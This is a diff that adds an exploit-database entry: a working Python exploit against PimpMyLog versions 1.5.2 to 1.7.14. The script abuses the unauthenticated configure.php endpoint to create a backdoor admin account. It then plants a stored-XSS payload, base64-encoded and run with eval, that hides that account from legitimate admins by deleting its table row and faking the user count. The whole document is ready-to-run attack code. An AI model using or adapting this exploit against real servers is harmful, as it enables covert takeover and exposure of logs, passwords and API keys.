@@ -1,0 +1,76 @@
+id: 38874
+date: 07/19/2023
+title: PimpMyLog v1.7.14 - Improper access control Exploit
+author: thoughtfault
+cves: 
+
+# Exploit Title: PimpMyLog v1.7.14 - Improper access control
+# Exploit Author: thoughtfault
+# Vendor Homepage: https://www.pimpmylog.com/
+# Software Link: https://github.com/potsky/PimpMyLog
+# Version: 1.5.2-1.7.14
+# Tested on: Ubuntu 22.04
+# CVE : N/A
+# Description: PimpMyLog suffers from improper access control on the account creation endpoint, allowing a remote attacker to create an admin account without any existing permissions. The username is not sanitized and can be leveraged as a vector for stored XSS. This allows the attacker to hide the presence of the backdoor account from legitimate admins.  Depending on the previous configuration, an attacker may be able to view sensitive information in apache, iis, nginx, and/or php logs. The attacker can view server-side environmental variables through the debug feature, which may include passwords or api keys.
+import requests
+import argparse
+from base64 import b64encode
+
+js = """var table = document.getElementById("userlisttable");
+var rows = table.getElementsByTagName("tr");
+for (var i = 0; i < rows.length; i++) {
+  var cells = rows[i].getElementsByTagName("td");
+  for (var j = 0; j < cells.length; j++) {
+    var anchors = cells[j].getElementsByTagName("a");
+    for (var k = 0; k < anchors.length; k++) {
+      if (
+        anchors[k].innerText === "{}" ||
+        anchors[k].innerText.includes("atob(") ||
+        anchors[k].querySelector("script") !== null
+      ) {
+        rows[i].parentNode.removeChild(rows[i]);
+      }
+    }
+  }
+}
+var userCountElement = document.querySelector('.lead');
+var userCountText = userCountElement.textContent;
+var userCount = parseInt(userCountText);
+if(!isNaN(userCount)){
+        userCount--;
+        userCountElement.textContent = userCount + ' Users';
+}"""
+
+payload = "<script>eval(atob('{}'));</script>"
+
+
+def backdoor(url, username, password):
+    config_url = url + '/inc/configure.php'
+
+    print("[*] Creating admin account...")
+    r = requests.post(config_url, data={'s':'authsave', 'u': username, 'p': password})
+    if r.status_code != 200:
+        print("[!] An error occured")
+        return
+
+    print("[*] Hiding admin account...")
+    base64_js = b64encode(js.format(username).encode()).decode()
+    xss_payload = payload.format(base64_js)
+
+    r = requests.post(config_url, data={'s':'authsave', 'u': xss_payload, 'p': password})
+    if r.status_code != 200:
+        print("[!] An error occured")
+        return
+
+
+    print("[*] Exploit finished!")
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--url', help='The base url of the target', required=True)
+parser.add_argument('--username', default='backdoor', help='The username of the backdoor account')
+parser.add_argument('--password', default='backdoor', help='The password of the backdoor account')
+args = parser.parse_args()
+
+backdoor(args.url.rstrip('/'), args.username, args.password)
+
+#  0day.today [2023-07-24]  #
